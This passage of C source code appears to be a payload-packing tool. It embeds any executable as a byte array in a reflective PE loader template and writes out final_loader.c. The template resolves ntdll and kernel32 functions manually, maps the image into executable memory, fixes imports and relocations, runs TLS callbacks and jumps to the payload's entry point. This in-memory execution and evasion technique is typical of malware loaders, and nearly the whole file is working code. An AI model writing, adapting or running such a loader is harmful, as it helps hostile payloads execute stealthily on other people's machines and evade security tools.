    "    pRtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString = (pRtlAnsiStringToUnicodeString)get_export_address_manual(h_ntdll, \"RtlAnsiStringToUnicodeString\", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, NULL, NULL);\n"
    "    pRtlFreeUnicodeString _RtlFreeUnicodeString = (pRtlFreeUnicodeString)get_export_address_manual(h_ntdll, \"RtlFreeUnicodeString\", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, NULL);\n"
    "    HMODULE h_kernel32 = get_module_handle_manual(\"kernel32.dll\");\n"
    "    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)get_export_address_manual(h_kernel32, \"VirtualAlloc\", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "    pVirtualProtect _VirtualProtect = (pVirtualProtect)get_export_address_manual(h_kernel32, \"VirtualProtect\", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "    PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)pe_blob;\n"
    "    PIMAGE_NT_HEADERS nt_headers_raw = (PIMAGE_NT_HEADERS)((char*)pe_blob + dos_header_raw->e_lfanew);\n"
    "    LPVOID pe_buffer = _VirtualAlloc(NULL, nt_headers_raw->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    "    if (!pe_buffer) return;\n"
    "    my_memcpy(pe_buffer, pe_blob, nt_headers_raw->OptionalHeader.SizeOfHeaders);\n"
    "    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt_headers_raw);\n"
    "    for (int i = 0; i < nt_headers_raw->FileHeader.NumberOfSections; i++) {\n"
    "        if (sections[i].PointerToRawData != 0) {\n"
    "            my_memcpy((char*)pe_buffer + sections[i].VirtualAddress, (char*)pe_blob + sections[i].PointerToRawData, sections[i].SizeOfRawData);\n"
    "        }\n"
    "    }\n"
    "    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((char*)pe_buffer + ((PIMAGE_DOS_HEADER)pe_buffer)->e_lfanew);\n"
    "    IMAGE_DATA_DIRECTORY import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n"
    "    if (import_dir.Size > 0) {\n"
    "        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pe_buffer + import_dir.VirtualAddress);\n"
    "        while (import_desc->Name) {\n"
    "            const char* dll_name = (char*)pe_buffer + import_desc->Name;\n"
    "            char resolved_dll[MAX_PATH]; resolve_api_set(dll_name, resolved_dll);\n"
    "            ANSI_STRING ansi_dll; UNICODE_STRING uni_dll;\n"
    "            _RtlInitAnsiString(&ansi_dll, resolved_dll);\n"
    "            _RtlAnsiStringToUnicodeString(&uni_dll, &ansi_dll, TRUE);\n"
    "            HANDLE h_module = NULL; _LdrLoadDll(NULL, NULL, &uni_dll, &h_module); _RtlFreeUnicodeString(&uni_dll);\n"
    "            if (h_module) {\n"
    "                PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->FirstThunk);\n"
    "                PIMAGE_THUNK_DATA original_first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->OriginalFirstThunk);\n"
    "                if (!import_desc->OriginalFirstThunk) original_first_thunk = first_thunk;\n"
    "                while (original_first_thunk->u1.AddressOfData) {\n"
    "                    PVOID addr = NULL;\n"
    "                    if (IMAGE_SNAP_BY_ORDINAL(original_first_thunk->u1.Ordinal)) {\n"
    "                        addr = get_export_address_manual((HMODULE)h_module, (char*)original_first_thunk->u1.Ordinal, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "                    } else {\n"
    "                        PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((char*)pe_buffer + original_first_thunk->u1.AddressOfData);\n"
    "                        addr = get_export_address_manual((HMODULE)h_module, (char*)import_by_name->Name, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "                    }\n"
    "                    first_thunk->u1.Function = (ULONG_PTR)addr; first_thunk++; original_first_thunk++;\n"
    "                }\n"
    "            }\n"
    "            import_desc++;\n"
    "        }\n"
    "    }\n"
    "    ULONG_PTR delta = (ULONG_PTR)pe_buffer - nt_headers->OptionalHeader.ImageBase;\n"
    "    if (delta != 0) {\n"
    "        IMAGE_DATA_DIRECTORY reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
    "        if (reloc_dir.Size > 0) {\n"
    "            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((char*)pe_buffer + reloc_dir.VirtualAddress);\n"
    "            while (reloc->VirtualAddress != 0) {\n"
    "                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n"
    "                WORD* list = (WORD*)((char*)reloc + sizeof(IMAGE_BASE_RELOCATION));\n"
    "                for (DWORD i = 0; i < count; i++) {\n"
    "                    WORD type = list[i] >> 12; WORD offset = list[i] & 0xFFF;\n"
    "                    if (type == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)((char*)pe_buffer + reloc->VirtualAddress + offset) += delta;\n"
    "                    else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((char*)pe_buffer + reloc->VirtualAddress + offset) += (DWORD)delta;\n"
    "                }\n"
    "                reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "#ifdef _WIN64\n"
    "    IMAGE_DATA_DIRECTORY exception_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];\n"
    "    if (exception_dir.Size > 0) {\n"
    "        pRtlAddFunctionTable _RtlAddFunctionTable = (pRtlAddFunctionTable)get_export_address_manual(h_ntdll, \"RtlAddFunctionTable\", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "        if (_RtlAddFunctionTable) _RtlAddFunctionTable((PRUNTIME_FUNCTION)((char*)pe_buffer + exception_dir.VirtualAddress), exception_dir.Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)pe_buffer);\n"
    "    }\n"
    "#endif\n"
    "    IMAGE_DATA_DIRECTORY tls_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];\n"
    "    if (tls_dir.Size > 0) {\n"
    "        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((char*)pe_buffer + tls_dir.VirtualAddress);\n"
    "        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;\n"
    "        if (callbacks) { while (*callbacks) { (*callbacks)(pe_buffer, DLL_PROCESS_ATTACH, NULL); callbacks++; } }\n"
    "    }\n"
    "    sections = IMAGE_FIRST_SECTION(nt_headers);\n"
    "    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {\n"
    "        DWORD protection = 0;\n"
    "        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {\n"
    "            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_EXECUTE_READWRITE;\n"
    "            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_EXECUTE_READ;\n"
    "            else protection = PAGE_EXECUTE;\n"
    "        } else {\n"
    "            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;\n"
    "            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_READONLY;\n"
    "            else protection = PAGE_NOACCESS;\n"
    "        }\n"
    "        DWORD old; _VirtualProtect((char*)pe_buffer + sections[i].VirtualAddress, sections[i].Misc.VirtualSize, protection, &old);\n"
    "    }\n"
    "    ((void(*)())((char*)pe_buffer + entry_point_rva))();\n"
    "}\n"
    "\n"
    "void main() {\n"
    "    load_pe();\n"
    "}\n";

void print_hex_array(FILE* out, const uint8_t* data, size_t size) {
    fprintf(out, "unsigned char pe_blob[] = {");
    for (size_t i = 0; i < size; i++) {
        if (i % 12 == 0) fprintf(out, "\n    ");
        fprintf(out, "0x%02X%s", data[i], (i == size - 1) ? "" : ", ");
    }
    fprintf(out, "\n};\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [loader_template.c]\n", (argc > 0) ? argv[0] : "exe_to_embedded_loader");
        return 1;
    }

    const char* payload_path = argv[1];
    const char* template_path = (argc > 2) ? argv[2] : "loader_template.c";

    FILE* fp = fopen(payload_path, "rb");
    if (!fp) { perror("Error opening payload"); return 1; }
    fseek(fp, 0, SEEK_END);
    size_t file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    uint8_t* file_data = (uint8_t*)malloc(file_size);
    fread(file_data, 1, file_size, fp);
    fclose(fp);

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)file_data;
    if (dos_header->e_magic != 0x5A4D) { printf("Invalid PE file\n"); return 1; }
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(file_data + dos_header->e_lfanew);
    DWORD entry_point_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR image_base = nt_headers->OptionalHeader.ImageBase;
    DWORD size_of_image = nt_headers->OptionalHeader.SizeOfImage;

    char* template_data = NULL;
    FILE* t_fp = fopen(template_path, "r");
    if (t_fp) {
        fseek(t_fp, 0, SEEK_END);
        size_t t_size = ftell(t_fp);
        fseek(t_fp, 0, SEEK_SET);
        template_data = (char*)malloc(t_size + 1);
        fread(template_data, 1, t_size, t_fp);
        template_data[t_size] = '\0';
        fclose(t_fp);
    } else {
        template_data = strdup(default_template);
    }

    FILE* out_fp = fopen("final_loader.c", "w");
    if (!out_fp) { perror("Error opening final_loader.c"); return 1; }

    char* p = template_data;
    while (*p) {
        if (strncmp(p, "// PE_BLOB_ARRAY", 16) == 0) {
            print_hex_array(out_fp, file_data, file_size);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// ENTRY_POINT_RVA", 18) == 0) {
            fprintf(out_fp, "// ENTRY_POINT_RVA\nDWORD entry_point_rva = 0x%X;\n", entry_point_rva);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// IMAGE_BASE", 13) == 0) {
            fprintf(out_fp, "// IMAGE_BASE\nULONG_PTR image_base = 0x%llX;\n", (unsigned long long)image_base);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// SIZE_OF_IMAGE", 16) == 0) {
            fprintf(out_fp, "// SIZE_OF_IMAGE\nSIZE_T size_of_image = 0x%X;\n", size_of_image);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else {
            fputc(*p++, out_fp);
        }
    }

    fclose(out_fp);
    free(file_data); free(template_data);
    printf("Generated final_loader.c successfully.\n");
    return 0;
}
